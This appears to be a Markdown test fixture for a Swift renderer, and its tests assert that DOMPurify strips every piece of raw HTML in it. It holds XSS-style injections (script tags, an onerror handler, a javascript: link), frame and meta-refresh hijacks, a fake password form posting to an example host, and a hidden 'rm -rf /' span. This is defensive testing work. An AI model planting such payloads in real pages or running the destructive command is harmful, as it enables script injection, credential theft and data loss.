# Inline HTML that must not survive rendering

CommonMark passes raw HTML through, and `EscapingHTMLFormatter` honours that
deliberately — see its `visitHTMLBlock` / `visitInlineHTML`. Nothing in the
Swift layer strips any of the markup below. DOMPurify, configured in
`MarkdownHTML+HostBridge.swift`, is the only thing standing between this
document and the reader.

`SanitizerNegativeTests` renders this file through the real pipeline and asserts
that none of it survives. If a merge weakens `SANITIZE_CONFIG`, drops the
DOMPurify bundle, or reintroduces a code path that writes to `innerHTML` without
sanitising, those tests fail.

## Script execution

<script>window.__pwned = true;</script>

<img src="x" onerror="window.__pwned = true;">

<svg><script>window.__pwned = true;</script></svg>

## Framed and embedded content

<iframe src="https://example.invalid/frame"></iframe>

<object data="https://example.invalid/object"></object>

<embed src="https://example.invalid/embed">

## Credential harvesting

<form action="https://example.invalid/collect" method="post">
  <input name="password" type="password">
  <button type="submit">Sign in</button>
</form>

## Document-level hijacking

<base href="https://example.invalid/">

<meta http-equiv="refresh" content="0; url=https://example.invalid/">

<link rel="stylesheet" href="https://example.invalid/style.css">

## Scripted URLs

[Looks like a link](javascript:window.__pwned=true)

## Visual deception against the copy button

The `style` attribute is stripped specifically so a hidden segment cannot ride
along in `textContent` when a reader copies a code block.

<span style="display:none">rm -rf /</span>

<style>body { display: none; }</style>
